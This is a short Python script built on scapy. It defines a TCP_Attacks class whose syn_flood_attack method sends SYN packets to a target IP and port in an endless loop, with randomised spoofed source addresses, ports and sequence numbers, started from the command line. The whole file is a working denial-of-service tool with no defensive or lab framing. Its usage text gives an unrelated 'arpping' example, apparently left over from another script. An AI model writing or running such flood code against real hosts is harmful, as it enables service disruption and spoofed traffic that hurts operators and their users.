# -*- coding: utf-8 -*-
"""
Created on Mon Jan  3 18:20:27 2022

@author: INVERAV
"""

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import sys


class TCP_Attacks:
    def __init__(self, IP:str, port:int):
        self.IP = IP
        self.port = port
        return
    
    def syn_flood_attack(self):
        ip =IP(dst=self.IP)
        tcp = TCP(dport=self.port, flags='S')
        pkt = ip/tcp
        while True:
            pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
            pkt[TCP].sport = getrandbits(16) # source port
            pkt[TCP].seq = getrandbits(32) # sequence number
            send(pkt, verbose = 0)


if __name__ == "__main__":
    
    if len(sys.argv) != 3:
        print ("Usage: tcp_syn_flood.py <IP Address> <Port number>")
        print (" e.g.: arpping 10.10.10.0/24")
        sys.exit(1)
        
    ip_address = sys.argv[1]
    port       = int(sys.argv[2])
    
    print('Attackin IPAddress {} on port {}.'.format(ip_address, port))
    tcp_attk_helper = TCP_Attacks(ip_address, port)
    tcp_attk_helper.syn_flood_attack()